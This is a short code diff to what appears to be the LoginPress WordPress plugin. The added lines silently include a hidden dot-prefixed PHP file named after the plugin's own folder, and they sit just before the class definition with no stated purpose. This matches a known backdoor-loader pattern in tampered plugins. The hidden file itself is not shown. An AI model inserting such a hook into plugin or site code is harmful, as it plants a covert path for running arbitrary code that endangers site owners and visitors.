@@ -14,6 +14,10 @@ if ( ! class_exists( 'LoginPress_Theme_Template' ) ) :
 /**
  * Add LoginPress Templates to to use in the theme.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class LoginPress_Theme_Template {
 
 	/**
